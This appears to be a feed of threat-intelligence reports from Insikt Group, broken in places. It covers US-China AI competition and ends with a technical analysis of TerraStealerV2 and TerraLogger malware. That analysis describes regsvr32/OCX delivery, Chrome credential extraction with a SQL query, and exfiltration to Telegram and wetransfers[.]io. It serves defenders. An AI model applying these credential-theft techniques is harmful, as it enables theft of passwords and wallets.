          <li>These new scam domains will likely use the merchant accounts identified in this report. Termination or suspension of scam merchant accounts by their acquirers is unlikely to halt all scam activity by the operator. However, this kind of remediation would almost certainly place additional time and resource demands on the scam network operator to acquire new merchant account infrastructure.</li>
        </ul>

            <description><![CDATA[Explore Insikt Group's in-depth 2025 report on the US-China AI race—comparing funding, talent, regulation, compute capacity, and model benchmarks. Discover why China trails the US and what could change before 2030.]]></description>
            <content:encoded><![CDATA[
        <h2>Executive Summary</h2>
        <p>China has stated its ambition to become the world leader in artificial intelligence (AI) by 2030, a goal that encompasses not only the performance of individual AI models that often attract significant media attention but also AI innovation broadly and widespread adoption of AI for economic and geopolitical benefit. Based on an analysis of key industry pillars informing the US-China competition for AI supremacy — including government and venture capital (VC) funding, industry regulation, talent, technology diffusion, model performance, and compute capacity — Insikt Group assesses that China is unlikely to sustainably surpass the United States (US) on its desired timeline. Currently, China either trails behind or does not clearly lead the US in any of these pillars. The US-China AI competition is likely to become tighter, with China's AI industry likely being a close second to the US globally and its AI models possibly outperforming the US at times or in some sectors. Chinese generative AI models likely lag behind US competitors by approximately three to six months as of this writing, based on Insikt Group analysis of publicly available Elo benchmarks, but potential new algorithmic breakthroughs along with agentic and collaborative AI systems could significantly sway the competitiveness of US or Chinese models before 2030.</p>
        <p>China’s government has sought to accelerate the development of a world-leading, globally influential AI industry since 2017, when authorities adopted a dedicated plan for achieving this goal. DeepSeek’s unveiling of R1 in January 2025 was a key milestone in this endeavor. R1’s capabilities reflect — and support continuing — noteworthy advances and lines of effort within China’s AI ecosystem. China’s AI research community is very likely benefiting from the government’s supportive policy environment, government-led investment initiatives, access to an increasingly high-quality talent pool, and increasing links between academia and industry. Chinese AI companies like DeepSeek have realized performance gains by innovating and embracing open source. These companies have also become proficient at adopting techniques implemented by US peers and domestic rivals and prioritizing cost efficiency to remain competitive in domestic markets. Chinese open-source models are being adopted domestically and abroad, while inventors and organizations in China are filing more patents for generative AI applications in many key industries such as software, finance, and energy.</p>
        <p>Despite this progress, China’s AI industry faces important challenges. Total private sector investment in AI lags far behind the US, and central government funding likely trails US federal investment by a small margin. China’s access to domestic AI-relevant talent is improving and the attractiveness of its domestic industry is increasing, but it is still insufficient, and the US likely retains its historical advantages. China’s regulations, although pioneering, likely create a drag on innovation for teams with any interest in making their products public. Moreover, China’s semiconductor industry — while achieving notable advances in spite of international export controls on specialized technology — is still unlikely to meet the rapidly growing demand for AI accelerator chips.</p>
        <p>Maintaining leadership in the race to artificial general intelligence (AGI) is almost certainly perceived in China and the US as critical to their national security. To this end, China is almost certain to continue applying its kit of licit and illicit tools for advancing national development, to include economic espionage and foreign talent recruitment. The US and allied governments should closely monitor major developments by Chinese generative AI companies and public and private investment in research and development (R&amp;D), in addition to monitoring indicators of AI diffusion, such as applications and patents. Western AI companies should consider proactively protecting themselves from model distillation and intellectual property (IP) theft. Western hardware manufacturers subject to export controls should continue improving end-customer due diligence processes to remain compliant and avoid selling to proxies of entities sanctioned by the US. Western government, academic, and corporate entities should adopt policies that facilitate the recruitment and retention of global AI talent.</p>
        <h2>Key Findings</h2>
        <ul>
          <li>China’s rapidly maturing AI ecosystem is very likely increasingly fostering collaboration between government, industry, and academia, and is supported by steady advances in semiconductor manufacturing.</li>
          <li>Government funding for AI-related technologies is likely on an upward trajectory in both the US and China as of early 2025, and China’s overall government-led funding likely exceeds investment by US federal and state governments; however, total private-sector investment in AI companies in the US vastly outmatches private-sector investment in China.</li>
          <li>China’s regulatory scheme likely hampers Chinese AI capabilities and extends development and deployment timelines — but only among developers aiming for public-facing products, meaning frontier advancements are unlikely to be impeded.</li>
          <li>The international AI talent pool likely continues to favor the US due to a continuing — though declining — immigration advantage and the quality of elite educational institutions, but the practical implications of this lead for AI competition are likely eroding.</li>
          <li>AI diffusion rather than innovation will very likely determine the "winner" in the competition to economically and geopolitically benefit from the technology, but whether the US or China has greater levels of diffusion is unclear, with one metric (patents) nevertheless showing China has a lead in many industries.</li>
          <li>According to Insikt Group's analysis of model benchmarks, Elo scores, and industry expert assessments, Chinese generative AI models likely now have a three to six-month performance gap behind US rivals, though this time lag is shortening.</li>
          <li>Closing the performance gap while being cost-competitive is very likely to pay off for China by driving the adoption of Chinese generative AI models domestically and abroad.</li>
          <li>Access to high-quality training data and IP is an increasingly contested domain where the US likely retains a competitive advantage; companies in both countries are likely leveraging user-generated content (UGC) to train generative AI models.</li>
          <li>Adopting open source is more prevalent among Chinese AI companies and likely enables China to diffuse its models more broadly than US proprietary models.</li>
          <li>US export controls have also almost certainly prompted the Chinese government to accelerate funding for its AI hardware and semiconductor industries and high-performance computing infrastructure for training and hosting AI models.</li>
          <li>China’s semiconductor industry likely still faces a bottleneck in producing sub-7 nanometer (nm) chips, and it is almost certainly attempting to develop its own extreme ultraviolet (EUV) lithography tools using alternative techniques to advance domestic AI accelerator production.</li>
          <li>Although the current US presidential administration has signalled that maintaining the US’s leading position in AI development is a priority, early actions to decrease public funding for science and target international students over alleged visa infractions likely risk undermining this goal.</li>
        </ul>
        <h2>Background</h2>
        <p>The race to AGI, which is <a href="https://research.aimultiple.com/artificial-general-intelligence-singularity-timing/">estimated</a> by AI experts and industry leaders to be concluded within the next five to ten years, holds considerable stakes for <a href="https://yoshuabengio.org/2024/10/30/implications-of-artificial-general-intelligence-on-national-and-international-security/">national security</a> and <a href="https://globalprioritiesinstitute.org/wp-content/uploads/Philip-Trammell-and-Anton-Korinek_economic-growth-under-transformative-ai.pdf">economic growth</a>. A <a href="https://www.businessinsider.com/sam-altman-cost-using-ai-drop-10-times-every-year-2025-2">declining cost</a> and general availability of human-level AI models — meaning that AI can perform most tasks previously done by humans, <a href="https://nickbostrom.com/papers/survey.pdf">better</a> than humans — will very likely <a href="https://www.brookings.edu/articles/generative-ai-the-american-worker-and-the-future-of-work/">disrupt</a> the future of work while simultaneously <a href="https://darioamodei.com/machines-of-loving-grace">leading</a> to explosive economic growth, with AI <a href="https://www.pwc.com/gx/en/issues/artificial-intelligence/publications/artificial-intelligence-study.html">estimated</a> to contribute $15.7 trillion to the global economy by 2030. Researchers continue <a href="https://www.forbes.com/sites/craigsmith/2023/05/04/geoff-hinton-ais-most-famous-researcher-warns-of-existential-threat/">debating</a> the existential risks and adversarial use of AI, ranging from <a href="https://www.dhs.gov/sites/default/files/2024-04/24_0429_cwmd-dhs-fact-sheet-ai-cbrn.pdf">facilitating</a> chemical, biological, radiological, and nuclear (CBRN) threats to <a href="/research/adversarial-intelligence-red-teaming-malicious-use-cases-ai">targeting</a> democratic processes and supporting <a href="https://openai.com/global-affairs/an-update-on-disrupting-deceptive-uses-of-ai/">offensive</a> <a href="https://cloud.google.com/blog/topics/threat-intelligence/adversarial-misuse-generative-ai">cyber operations</a>. The notion of "<a href="https://www.belfercenter.org/publication/china-beating-us-ai-supremacy">AI supremacy</a>" captures the geopolitical stakes of the AGI race, with the US and China considered by many to be <a href="https://www.csis.org/analysis/securing-agi-laurel-export-controls-compute-gap-and-chinas-counterstrategy">forerunners</a>.</p>
        <p>On January 20, 2025, Chinese AI research company DeepSeek <a href="https://api-docs.deepseek.com/news/news250120">released</a> R1, an open-source reasoning large language model (LLM) competing with OpenAI’s then state-of-the-art o1 model. The following week, US AI hardware company Nvidia subsequently <a href="https://www.reuters.com/technology/chinas-deepseek-sets-off-ai-market-rout-2025-01-27/">lost</a> $593 billion in market value, marking the single largest market capitalization loss in US history. Media headlines <a href="https://www.npr.org/2025/01/28/g-s1-45061/deepseek-did-a-little-known-chinese-startup-cause-a-sputnik-moment-for-ai">compared</a> DeepSeek’s release of R1 to the Space Race’s "Sputnik moment," <a href="https://www.rusi.org/explore-our-research/publications/commentary/what-would-sputnik-moment-us-china-ai-competition-look">referring</a> to a rapid and unexpected shift in perceived adversary capabilities following the Soviet Union’s surprise launch of the Sputnik satellite into orbit on October 4, 1957.</p>
        <p>The US-Soviet "missile gap" theory is a likely more accurate Cold War analogy of current threat perceptions. Like missile production, the AGI race is not measured solely by <a href="https://www.tandfonline.com/doi/abs/10.1080/08956308.2024.2324407">innovation capacity</a> (launching Sputnik) but also <a href="https://www.fpri.org/article/2024/09/explaining-chinas-diffusion-deficit/">diffusion capacity</a>, or the ability of national ecosystems to align capital, talent, and policies to rapidly convert innovations to economically productive processes (winning the Cold War). The missile gap analogy is also accurate insofar as US leaders <a href="https://www.armscontrol.org/act/2011-05/missile-gap-myth-and-its-progeny">long possessed</a> inaccurate data on Soviet missile capabilities; it was only by 1961 that innovations in satellite imagery <a href="https://www.thespacereview.com/article/523/1">allowed</a> decision-makers to obtain reliable data on this so-called "missile gap." Following the launch of the CORONA satellite project to monitor Soviet ICBM capabilities and Chinese nuclear testing, US President Lyndon Johnson <a href="https://web.archive.org/web/20220505011605/https://www.nytimes.com/1995/09/12/science/spy-satellites-early-role-as-floodlight-coming-clear.html">admitted</a> in 1967: "We've spent $35 billion or $40 billion on the space program. [...] We were doing things we didn't need to do. We were building things we didn't need to build. We were harboring fears we didn't need to harbor." Similarly, advances (whether real or speculative) in Chinese AI development are very likely fueling funding for AI research in the US, where AI capital expenditure is <a href="https://www.businessinsider.com/big-tech-ai-capex-spend-meta-google-amazon-microsoft-earnings-2025-2">projected to reach over $320 billion</a> in 2025, and influencing <a href="https://cdn.openai.com/global-affairs/ostp-rfi/ec680b75-d539-4653-b297-8bcf6e5f7686/openai-response-ostp-nsf-rfi-notice-request-for-information-on-the-development-of-an-artificial-intelligence-ai-action-plan.pdf">opinions</a> on issues like AI regulation.</p>
        <p>Maintaining an accurate threat perception of Chinese AI will almost certainly be key for major business and national security decision-makers in the US and its partners in the coming years. Despite the public perception of sudden and opaque progress via the lens of a "Sputnik moment," the development of China’s AI ecosystem almost certainly bears the fruit of long-term investments, iterative innovation, and the necessity for efficiency gains in the face of hardened chip export controls.</p>
        <h2>China’s AI Industry and Landscape</h2>
        <p>In July 2017, China’s State Council <a href="https://web.archive.org/web/20250303185319/http://www.gov.cn/zhengce/content/2017-07/20/content_5211996.htm">issued</a> the "New Generation Artificial Intelligence Development Plan" (AIDP; 新一代人工智能发展规划), which outlined an ambitious path to <a href="https://digichina.stanford.edu/work/full-translation-chinas-new-generation-artificial-intelligence-development-plan-2017/">achieving</a> "world-leading" AI theories, technologies, and applications and becoming the "world’s primary AI innovation center" by 2030. To achieve these goals, the AIDP calls (in part) for the activities listed below. The AIDP also outlined key challenges China faced at the time — and to some extent continues to face — including a lack of breakthroughs in basic AI theory, algorithms, high-end chips, and other resources and outputs. Since that time, Chinese universities and businesses have become increasingly involved in AI conferences at the frontiers of AI research and have released hundreds of generative AI models. At the same time, China’s semiconductor industry is steadily advancing its capabilities in spite of international restrictions.</p>
        <p>According to the AIDP, China would seek — and in many ways has begun, as documented in this report — to:</p>
        <ul>
          <li>Support a development framework that enables industry, academia, and other sectors to pursue joint and cross-disciplinary innovation</li>
          <li>Seek breakthroughs in R&amp;D, applications, and overall industry, including along the AI-relevant industrial chain</li>
          <li>Improve training and recruitment of talent, focusing on AI specifically as well as AI’s application in other fields</li>
          <li>Promote AI applications and AI-related innovations across industries, enterprises, and services</li>
          <li>Coordinate support for AI across China’s main science and technology (S&amp;T) pillars, including key programs, megaprojects, bases, and talent plans</li>
          <li>Adopt a system of laws, regulations, and norms to aid the development of AI</li>
          <li>Disseminate news of China’s AI progress to foster a society enthusiastic about, and supportive of, AI development</li>
        </ul>
        <p>China’s S&amp;T innovation <a href="https://scsp222.substack.com/p/the-missing-piece-in-chinas-innovation">apparatus</a> very likely <a href="https://web.archive.org/web/20240618141413/https://mp.weixin.qq.com/s/NZxXb-LTiM3-PY4M36_VSA">emphasizes</a> (though it is perceived to be deficient in) collaboration among government — including laboratories and state-owned enterprises [SOE]) — industry, and academia. Accordingly, entities from each of these sectors contribute to China’s AI development enterprise. Entities from all three sectors are increasingly producing noted contributions to AI R&amp;D and applications. Contributions to theoretical research can be observed in scholarly papers accepted to the prestigious AI-focused Conference on Neural Information Processing Systems (NeurIPS) since 2021. <strong>Table 1</strong> lists examples of government, industry, and academic entities from among the top fifteen institutions named as the affiliation of one or more co-authors on papers accepted by the conference (2021–2024). Note that there are no top-fifteen NeurIPS contributors from China that are SOEs; two are included in <strong>Table 1</strong> to indicate that some SOEs are nevertheless attempting and occasionally succeeding to contribute to frontier AI advancement.</p>

SHLAB was <a href="https://archive.ph/3eHPo">created</a> in 2020 as an almost certainly state-affiliated "new-type scientific research institution" (新型科研机构). <a href="https://web.archive.org/web/20240908135712/https://www.shlab.org.cn/aboutus">Described</a> as a "large-scale comprehensive research base" (大型综合性研究基地), SHLAB offers open-source information repositories and platforms that facilitate AI development in specific areas. For example, its <a href="https://web.archive.org/web/20240910204955/https://openmmlab.com/">OpenMMLab</a> is an "open-source computer vision algorithm <a href="https://github.com/open-mmlab">system</a>" that seeks to <a href="https://web.archive.org/web/20240910204955/https://openmmlab.com/">facilitate</a> academic and industry applications; it claims to have users from more than 100 countries and territories (<strong>Figure 1</strong> shows reported user affiliations). SHLAB’s website further <a href="https://web.archive.org/web/20240908135712/https://www.shlab.org.cn/aboutus">asserts</a> strategic partnerships with at least thirteen universities across China.

        <p>According to information <a href="https://web.archive.org/web/20250108233824/https://www.cac.gov.cn/2024-04/02/c_1713729983803145.htm">released</a> by the Cyberspace Administration of China, 302 generative AI service models are fully <a href="https://web.archive.org/web/20250203172535/https://www.stdaily.com/web/gdxw/2025-01/09/content_284094.html">registered</a> in China as of January 2025. Noteworthy frontier model companies contributing to China’s LLM capabilities — most often from the private sector, with some seen in the NeurIPS data — include DeepSeek, Alibaba, Baidu, 01.AI, Tencent, Stepfun, ByteDance, Infinigence AI, and ModelBest. Signifying the important role of academia-industry linkages, China’s "new AI tigers" — Baichuan AI, MiniMax, Moonshot AI, and Zhipu AI — were <a href="https://itif.org/publications/2024/08/26/how-innovative-is-china-in-ai/">founded</a> by Tsinghua University faculty and graduates.</p>
        <p>China’s semiconductor industry plays a key role in supporting the country’s ecosystem for AI development, which is almost certainly critical to achieving the AIDP’s goals. Faced with explicit efforts by the US to curtail China’s advances in both AI and semiconductors, China’s support — including financial support — for the domestic semiconductor industry has almost certainly accelerated. One vehicle of state-led investment, the <a href="https://www.reuters.com/technology/china-sets-up-475-bln-state-fund-boost-semiconductor-industry-2024-05-27/">multi-phase</a> China Integrated Circuit Industry Investment Fund ("Big Fund"; 国家集成电路产业投资基金) had minority <a href="https://thechinaproject.com/2023/02/03/chinas-top-10-semiconductor-firms/">ownership</a> in at least 74 domestic semiconductor companies as of February 2023. Huawei is a particularly important and rising <a href="https://merics.org/en/report/huawei-quietly-dominating-chinas-semiconductor-supply-chain">contributor</a> to China’s semiconductor industry, but multiple Chinese companies are making progress or experimenting with methods (<strong>Table 2</strong>) that — while far from cutting-edge capabilities and likely currently insufficient for domestic demand — likely have the potential to alleviate China’s dependence on the US and others in the long term. In March 2025, Bloomberg reported (citing unnamed sources) that China’s Ant Group had <a href="https://www.bloomberg.com/news/articles/2025-03-24/jack-ma-backed-ant-touts-ai-breakthrough-built-on-chinese-chips">found</a> a way to train AI models using domestically produced chips at a cheaper cost but with similar results compared to those obtained by using US chips.</p>

        <p><strong><em>Table 2:</em></strong> <em>Evidence of development and milestones in China’s domestic semiconductor industry (Source: Insikt Group)</em><br /><br />Economic espionage, whether state-led or otherwise, also very likely supports China’s progress in advancing its AI and semiconductor industries. It would be inaccurate to attribute all progress to this activity, but government-directed and tacitly allowed espionage almost certainly remains an important instrument in China’s <a href="https://www.uscc.gov/sites/default/files/2025-02/Kyle_Chan_Testimony.pdf">toolkit</a> for achieving modernization. In October 2023, intelligence leaders of the Five Eyes alliance <a href="https://www.reuters.com/world/five-eyes-intelligence-chiefs-warn-chinas-theft-intellectual-property-2023-10-18/">noted</a> AI as one sector targeted by China’s illicit actions. In February 2025, the US Department of Justice <a href="https://www.justice.gov/opa/pr/superseding-indictment-charges-chinese-national-relation-alleged-plan-steal-proprietary-ai">indicted</a> a former software engineer at Google over alleged attempts between mid-2022 and mid-2023 to steal proprietary information on hardware and software enabling supercomputing in support of large AI models. The engineer allegedly intended to use the information to support his own and another early-stage AI-related company. In November 2024, a former employee of South Korea’s SK Hynix Inc. was <a href="https://www.asiafinancial.com/sk-hynix-worker-jailed-for-stealing-chip-tech-korea-bizwire">convicted</a> of printing and seeking to retain proprietary documents on semiconductor manufacturing solutions in mid-2022, likely to <a href="https://web.archive.org/web/20240528140713/https://m.koreatimes.co.kr/pages/article.amp.asp?newsIdx=375511">facilitate</a> her role in a new position at Huawei. Although not always a form of espionage, China’s AI sector very likely further benefits from concerted efforts to <a href="https://www.trendforce.com/news/2025/02/21/new-ai-talent-race-heats-up-in-china-as-xiaomi-bytedance-and-alibaba-compete-for-experts/">attract</a> and <a href="https://chinatalenttracker.cset.tech/">recruit</a> <a href="https://www.reuters.com/technology/china-quietly-recruits-overseas-chip-talent-us-tightens-curbs-2023-08-24/">foreign</a> <a href="https://cset.georgetown.edu/publication/gao-huajian-and-the-china-talent-returnee-question/">talent</a>. Additionally, there is <a href="https://www.theverge.com/news/601195/openai-evidence-deepseek-distillation-ai-data">evidence</a> that Chinese companies have circumvented foreign platforms’ terms of service to enhance their own models through model distillation techniques.</p>
        <h3>Government and Venture Capital (VC) Funding</h3>
        <p>Funding for AI-related technologies is likely on an upward <a href="https://web.archive.org/web/20250317132408/http://www.xinhuanet.com/fortune/20250313/a7cb29ba2b3a49f4a9ac9a7c57dac9eb/c.html">trajectory</a> in both the US and China as of early 2025. Direct comparisons are difficult due to definitional issues and — especially with regard to China — data intransparency, but US federal government funding for civilian (non-military) AI likely exceeds the Chinese central government’s funding by up to several billion USD per year, especially in light of evidence of declining expenditure by Beijing until approximately 2023 (likely in part due to COVID-19). The balance of government-led investment when including activity at the state and provincial levels likely leans in China’s favor, where guidance funds combine public and private capital to invest approximately $16 billion annually in likely AI-related companies (broadly defined). Total private-sector investment in AI companies in the US far outstrips private-sector investment in China.</p>
        <p>According to Federal Budget IQ, the US federal government has <a href="https://federalbudgetiq.com/insights/federal-ai-and-it-research-and-development-spending-analysis/">increased</a> its AI and IT R&amp;D spending from $8.2 billion in 2021 to $10.4 billion in 2024, a nearly 27% increase. The 2025 fiscal year budget earmarked $11.2 billion for AI and IT R&amp;D spending. Removing spending by the US Department of Defense (DoD; $2.035 billion) and the Defense Advanced Research Projects Agency (DARPA; $1.41 billion), US federal spending on AI and IT R&amp;D for civilian applications represents approximately $7.33 billion. Within this, the budget for "core" AI ($1.955 billion) is the largest component, though funding for the likely AI-relevant area of high-capacity computing is also rising quickly. The US federal budget for "core" and "cross-cut" AI in fiscal year 2025 combined is $2.8 billion (excluding US DoD and DARPA).</p>
        <p>In China, total central government funding for AI is much more opaque. <strong>Figure 2</strong> and <strong>Figure 3</strong> show likely AI-related investment in basic, applied, and experimental R&amp;D over recent years for two of China’s <a href="https://www.uscc.gov/sites/default/files/2024-02/Ngor_Luong_Testimony.pdf">largest</a> government-run institutions: the National Natural Science Foundation of China (NSFC) and the Chinese Academy of Sciences (CAS). Specifically, <strong>Figure 3</strong> presents data from the budgets of three CAS institutes particularly <a href="https://cset.georgetown.edu/publication/fueling-chinas-innovation-the-chinese-academy-of-sciences-and-its-role-in-the-prcs-st-ecosystem/">focused</a> on AI. <strong>Figure 4</strong> shows notionally earmarked funds for research to be conducted under China’s "New Generation Artificial Intelligence" Megaproject (科技创新 2030—"新一代人工智能"重大项目). In addition to these data points and trends, the two organizations <a href="https://cset.georgetown.edu/publication/chinas-state-key-laboratory-system/">supervising</a> nearly half of China’s state key labs (SKLs) — the Ministry of Education and CAS — cumulatively budgeted 2.4 billion RMB ($327 million) under associated R&amp;D line items. Of this, approximately 29% would go to SKLs in the information and communications technology field, assuming funds were distributed equally among all SKLs supervised by these organizations and not accounting for other known unknowns.</p>
        <p>Insikt Group’s review of the data summarized above and evidence from other central government funding channels leads us to a low-confidence estimate that China’s central government spends on the order of several billion USD annually on likely AI-related R&amp;D, roughly similar to the US government’s <a href="https://federalbudgetiq.com/insights/federal-ai-and-it-research-and-development-spending-analysis/#:~:text=For%20core%20AI%20funding%2C%20the,and%20Agriculture%20(%24104%20million).">spending</a> on "core" and "cross-cut" AI (excluding US DoD and DARPA). Because "core" and "cross-cut" AI have a clear definition and estimating China’s funding relies on imperfect visibility into the research program it targets, it is likely that US federal government funding for AI is higher than that of China’s central government. Total Chinese government-led investment in AI — via guidance funds — likely exceeds US cumulative federal and state investment, however (discussed further below).</p>

        <p>The declining trend through the early 2020s is likely related to the impact of COVID-19 on China’s economy, but should also be viewed cautiously given missing data from other central government funding channels. As of early 2025, central government actors have signaled increasing interest in AI. In January 2025, Bank of China <a href="https://web.archive.org/web/20250127130750/https://www.bankofchina.com/aboutboc/bi1/202501/t20250123_25254674.html">announced</a> a five-year plan for financially supporting the AI industry value chain with a minimum of one trillion RMB ($138 billion). In March 2025, China’s National Development and Reform Commission <a href="https://archive.ph/7rzg6">announced</a> the establishment of a National Innovation Investment Guidance Fund (国家创业投资引导基金). The new fund is being dubbed an "aircraft carrier-level" (航母级) fund and will seek to raise one trillion RMB ($138.2 billion) while focusing investment on start-up, early-stage, small-, and medium-sized enterprises in "frontier domains" like AI, quantum science, and future energy. Indicating its focus on the concept of "patient capital," the fund’s duration is being set at twenty years — reportedly about five years longer than most other guidance funds.</p>
        <p>Government guidance funds, such as the one announced in March 2025, have been established at multiple levels of government in China and <a href="https://cset.georgetown.edu/publication/understanding-chinese-government-guidance-funds/">mix</a> funds from governmental and non-governmental sources (including corporate sources). This creates a challenge when attempting to isolate just central government funding. However, research published by the National Bureau of Economic Research (NBER) has <a href="https://www.nber.org/system/files/working_papers/w32701/w32701.pdf">found</a> that more broadly across central, provincial, and local governments, these guidance funds have "invested in 9,623 unique AI firms through more than 20,000 transactions, in total 184 billion USD" between 2000 and 2023, with the majority of transactions occurring since 2013. Annualizing this estimate over the 2013–2023 period points to an average spend of $16.7 billion per year, though the NBER study’s method of identifying AI companies was very broad and potentially leads to an overestimate. There are state-level initiatives in the US, such as New York’s Empire AI consortium that has received $565 million in <a href="https://www.governor.ny.gov/news/governor-hochul-unveils-fifth-proposal-2024-state-state-empire-ai-consortium-make-new-york">funding</a> from public and private <a href="https://govmarketnews.com/new-york-boosts-ai-research-with-165m-funding-package/">sources</a>, but they likely do not match sub-national funding in China, which is steadily increasing. In January 2025, two state-backed Chinese investment <a href="https://archive.ph/cjS4z">companies</a> <a href="https://archive.ph/RZBdk">announced</a> the creation of a National Artificial Intelligence Industry Investment Fund (国家人工智能产业投资基金) with an initial registered capital of 60 billion RMB ($8.2 billion).</p>
        <p>Although China’s government may be ahead in terms of total AI investment — when the likely small lag in central government spending is compared to the likely larger lead in sub-national investment through guidance funds — total private-sector investment in AI companies in the US vastly outmatches private-sector investment in China. This is seen in data (<strong>Figure 5</strong>) collected by both Stanford University’s Center for Human-Centered Artificial Intelligence (Stanford HAI) and the Emerging Technology Observatory (ETO), a project under Georgetown University’s Center for Security and Emerging Technology (CSET). Note that there is likely overlap between the aforementioned investments of China’s guidance funds and the private-sector investment data; that is, this data likely does not exclude investments in AI companies that come from government sources. This private-sector investment data is narrower, however; ETO’s data only reflects investments into 2,100 Chinese AI companies compared to the NBER study’s over 9,000 companies.</p>

          <img loading="lazy" alt="insikt group logo" src="https://www.recordedfuture.com/media_17759d8b91bf0c9106a0fa82007bef7e3316158b4.png?width=750&amp;format=png&amp;optimize=medium" width="300" height="48" />
        </p>
        <h2>Executive Summary</h2>
        <p>Insikt Group identified two new malware families — TerraStealerV2 and TerraLogger — linked to the financially motivated threat actor Golden Chickens (also known as Venom Spider). Golden Chickens is known for operating a Malware-as-a-Service (MaaS) platform used by cybercriminal groups such as FIN 6, Cobalt Group, and Evilnum. The new families, observed between January and April 2025, suggest ongoing development aimed at credential theft and keylogging.</p>
        <p>TerraStealerV2 is designed to collect browser credentials, cryptocurrency wallet data, and browser extension information. While it targets the Chrome “Login Data” database to steal credentials, it does not bypass Application Bound Encryption (ABE) protections introduced in Chrome updates after July 2024, indicating the malware code is outdated or still under development. Data is exfiltrated to both Telegram and the domain wetransfers[.]io. The stealer has been observed being distributed via multiple formats, including LNK, MSI, DLL, and EXE files, and leverages trusted Windows utilities, such as regsvr32.exe and mshta.exe, to evade detection.</p>
        <p>TerraLogger, by contrast, is a standalone keylogger. It uses a common low-level keyboard hook to record keystrokes and writes the logs to local files. However, it does not include functionality for data exfiltration or command-and-control (C2) communication, indicating it is either in early development or intended to be a modular part of the Golden Chickens MaaS ecosystem.</p>
        <p>The current state of TerraStealerV2 and TerraLogger suggests that both tools remain under active development and do not yet exhibit the level of stealth typically associated with mature Golden Chickens tooling. Given Golden Chickens’ history of developing malware for credential theft and access operations, these capabilities will likely continue to evolve. Organizations are advised to follow the mitigation guidance provided in this report to reduce the risk of compromise as these malware families mature.</p>
        <h2>Key Findings</h2>
        <ul>
          <li>Insikt Group identified two new malware families, TerraStealerV2 and TerraLogger, attributed to the threat actor Golden Chickens. TerraStealerV2 can steal browser credentials and target cryptocurrency wallets, while TerraLogger functions solely as a standalone keylogger module.</li>
          <li>TerraLogger is the first observed use of a keylogging capability within malware developed by Golden Chickens.</li>
          <li>TerraStealerV2 lacks support for decrypting Chrome ABE-protected credentials, indicating the tool is likely outdated or still under development.</li>
          <li>Insikt Group observed ten distinct TerraStealerV2 distribution samples between January and March 2025 that employed varied delivery methods, including MSI, DLL, and LNK files.</li>
        </ul>
        <h2>Background</h2>
        <p>Golden Chickens, also tracked under the alias Venom Spider, is a financially motivated cyber threat actor known for operating a stealthy and modular malware suite under a MaaS model. Since <a href="https://www.esentire.com/resources/library/unmasking-venom-spider">at least</a> 2018, the Golden Chickens MaaS suite has been deployed in campaigns targeting high-value organizations through social engineering vectors, particularly spearphishing campaigns leveraging fake job offers or resumes. Notably, the malware is used by top-tier cybercrime groups, including Russia-based FIN6 and Cobalt Group, as well as the Belarus-based Evilnum, which has been <a href="https://www.esentire.com/resources/library/unmasking-venom-spider">linked</a> to damages of over $1.5 billion USD globally￼.</p>
        <p>The core components of the Golden Chickens MaaS suite are VenomLNK and TerraLoader. Initial infections are typically achieved through VenomLNK, a malicious Windows shortcut file, which executes TerraLoader, a loader module responsible for deploying additional Golden Chickens malware. These modules include TerraStealer for credential harvesting, TerraTV for TeamViewer hijacking, and TerraCrypt for ransomware deployment. Additional malware families attributed to the Golden Chickens ecosystem include TerraRecon for reconnaissance, TerraWiper for data wiping, and lite_more_eggs, as depicted in Figure 1 below.</p>

These tools were delivered via VenomLNK campaigns, leveraging social engineering lures like cryptocurrency payment requests and software API documentation. <strong>Figure 2</strong> illustrates the attack chain used to deliver RevC2.</p>

        <p>While the initial delivery vector is not known, the infection sequence begins with the execution of a VenomLNK file. This file downloads a decoy image consistent with the lure theme (in this case, software API documentation) and initiates RevC2 execution. Specifically, the LNK file leverages wmic.exe to invoke regsvr32.exe, which loads a malicious OCX payload hosted on a remote network share.</p>
        <h2>Technical Analysis</h2>
        <p>Insikt Group identified two new malware families attributed to the threat actor group Golden Chickens. The first, tracked as TerraStealerV2, is a stealer primarily targeting browser credentials, cryptocurrency wallets, and browser extensions. The second, tracked as TerraLogger, is a keylogger observed as a standalone module. The following subsections provide a detailed technical analysis of each malware family.</p>
        <h3>TerraStealerV2</h3>
        <p>Insikt Group recently identified a new stealer attributed to Golden Chickens, uploaded to Recorded Future Malware Intelligence on March 3, 2025. A Program Database (PDB) path embedded in the sample (see <strong>Figure 3</strong>) suggests the threat actor refers to the malware as NOK; however, Insikt Group tracks it as TerraStealerV2.</p>

          </div>
        </div>
        <p><strong><em>Figure 3:</em></strong> <em>TerraStealerV2 PDB string (Source: Recorded Future)</em></p>
        <p>The stealer is intended to be delivered as an OCX file and executed via regsvr32.exe, which invokes the DllRegisterServer export function. Upon execution, DllRegisterServer first checks that the provided file has a .ocx extension and that the filename ends with a specific hard-coded character or digit (for example, 0.ocx). It then verifies that the file is being run by regsvr32.exe before proceeding, as illustrated in <strong>Figure 4</strong> below.</p>

          </div>
        </div>
        <p>The malware then performs string deobfuscation using an XOR decoding routine with a hard-coded key. It collects basic host information by invoking <a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getusernamea">GetUserNameA</a> and <a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getcomputernamea">GetComputerNameA</a> to retrieve the local user and system names. It then determines the victim’s IP address by making an HTTP request to <em>ifconfig[.]me</em>. The collected data is subsequently exfiltrated via the Telegram messaging platform to a channel named “Noterdam” using a bot token associated with “NoterdanssBot,” as shown in <strong>Figure 5</strong>.</p>

        <p>The malware then enumerates active processes, searching for instances of chrome.exe; if detected, it attempts to terminate the process using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-terminateprocess">TerminateProcess</a> Windows API. This behavior is likely intended to release any file locks on Chrome’s browser database files, ensuring unobstructed access during data extraction. Following this, the malware attempts to extract stored credentials and other sensitive data from Chrome and targets specific cryptocurrency wallets and browser extensions.</p>
        <p>The Chrome browser database theft implementation copies the "Login Data" database to C:ProgramData\Temp\LoginData and then extracts saved logins using a statically linked SQLite library to execute the SQL query SELECT origin_url, username_value, password_value FROM logins. TerraStealerV2 uses SQLite version 3.46.0, which is the same version statically linked in RevC2, suggesting possible code reuse or shared development practices. However, the implementation does not bypass Chrome’s ABE, meaning collected passwords will not be decrypted for any hosts with Chrome-based browsers updated since July 24, 2024. This limitation suggests that the stealer code is outdated or still under active development, as effective stealers typically incorporate ABE bypass techniques to extract decrypted credentials from modern versions of Chrome or Microsoft Edge.</p>
